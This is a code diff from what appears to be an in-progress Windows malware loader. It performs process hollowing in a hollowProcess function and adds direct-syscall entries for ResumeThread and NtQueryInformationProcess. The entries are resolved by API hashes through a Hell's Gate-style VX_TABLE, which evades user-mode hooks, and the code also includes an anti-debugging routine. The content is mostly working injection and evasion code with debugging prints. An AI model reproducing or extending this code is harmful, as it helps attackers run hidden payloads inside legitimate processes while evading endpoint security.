@@ -18,11 +18,13 @@ typedef struct _VX_TABLE {
     VX_TABLE_ENTRY Protect;
     VX_TABLE_ENTRY Read;
     VX_TABLE_ENTRY Write;
+    VX_TABLE_ENTRY ResumeThread;
+    VX_TABLE_ENTRY QueryInfoProcess;
 } VX_TABLE, * PVX_TABLE;
     
 //PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
 
-#define num_syscalls 50
+#define num_syscalls 50 //kinda expiremental , i sorta wnat this defined early on so i can just in and start populating
 PVOID* pSystemCalls[num_syscalls];
 VX_TABLE VxTable = { 0 };
 void initializeSystemCalls() {
@@ -156,12 +158,14 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     PROCESS_BASIC_INFORMATION basicInformation = { 0 };
     printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
     //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
-    NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+    //NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
 
-    myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
+    //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
 
+    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
+    NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
 
-
+    printf("NTSTATUS????? %d", result);
     //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
     printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
 
@@ -195,7 +199,7 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
    // printf("RESULTSS????? %d, %d\n", result, bytesRW);
     getchar();
     gCurrentSyscall = VxTable.Read.wRCXVal;
-    NTSTATUS result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     getchar();
     printf("Enging NoahRead\n");
     
@@ -285,7 +289,10 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     //ResumeThread(Pi.hThread);
     PULONG suspendCount;
 
-    Sw3NtResumeThread(Pi.hThread, &suspendCount);
+    //Sw3NtResumeThread(Pi.hThread, &suspendCount);
+    gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
+    result = NoahRead3(Pi.hThread, &suspendCount);
+    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
 }
 
 void detectDebug() {
@@ -760,8 +767,21 @@ EXTERN_C void UpdateGlobals(DWORD input) {
         getchar();
         return VxTable.Protect.wSystemCall;
     }
-    return (DWORD)VxTable.Read.wSystemCall;
-
+    else if (input == 4) { //ResumeThread
+        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.ResumeThread.wSystemCall;
+        getchar();
+        return VxTable.ResumeThread.wSystemCall;
+    }
+    else if (input == 5) { //QueryInfoProcess
+        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.QueryInfoProcess.wSystemCall;
+        getchar();
+        return VxTable.QueryInfoProcess.wSystemCall;
+    }
+    printf("Syscall input not found, check your input in C or RCX\n");
 
 }
 
@@ -827,6 +847,8 @@ int main() {
     VX_TABLE_ENTRY Read = { 0 };
     VX_TABLE_ENTRY Allocate= { 0 };
     VX_TABLE_ENTRY Protect = {0};
+    VX_TABLE_ENTRY ResumeThread = { 0 };
+    VX_TABLE_ENTRY QueryInfoProcess = { 0 };
 
     //Hashes retrieved from Hasher code
     VxTable.Write = Write;
@@ -840,6 +862,14 @@ int main() {
     
     VxTable.Protect = Protect;
     VxTable.Protect.dwHash = strtoull("87C51496", NULL, 16);
+
+    VxTable.ResumeThread = ResumeThread;
+    VxTable.ResumeThread.dwHash = strtoull("2F7CB09E", NULL, 16);
+
+    VxTable.QueryInfoProcess = QueryInfoProcess;
+    VxTable.QueryInfoProcess.dwHash = strtoull("4F0DBC50", NULL, 16);
+
+
     printf("0x%0.8X\n", VxTable.Protect.dwHash);
 
     printf("Struct populated...\n");
@@ -857,6 +887,11 @@ int main() {
     VxTable.Allocate.wRCXVal = 2;
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.Protect);
     VxTable.Protect.wRCXVal = 3;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.ResumeThread);
+    VxTable.ResumeThread.wRCXVal = 4;
+    GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
+    VxTable.QueryInfoProcess.wRCXVal = 5;
+
 
     //GetSystemcallAddresses(dwDLLSize, &pSystemCalls, pNtdllBase, pTextSection);
 
